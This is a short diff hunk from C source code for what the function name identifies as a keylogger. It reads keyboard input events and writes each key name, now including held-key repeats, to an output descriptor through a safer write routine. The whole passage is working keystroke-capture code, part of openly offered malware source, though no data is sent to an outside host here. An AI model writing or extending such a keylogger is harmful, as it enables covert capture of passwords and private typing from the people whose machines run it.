@@ -165,7 +165,21 @@ void keylogger(int keyboard, int writeout)
           }
           else
           {
-            write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
+            safe_write_all(writeout, "UNRECOGNIZED", keyboard);
+            safe_write_all(writeout, "\n", keyboard);
+          }
+        }
+        else if (events[i].value == 2)
+        {
+          if (events[i].code > 0 && events[i].code < NUM_KEYCODES)
+          {
+            safe_write_all(writeout, keycodes[events[i].code], keyboard);
+            safe_write_all(writeout, "\n", keyboard);
+          }
+          else
+          {
+            safe_write_all(writeout, "UNRECOGNIZED", keyboard);
+            safe_write_all(writeout, "\n", keyboard);
           }
         }
       }
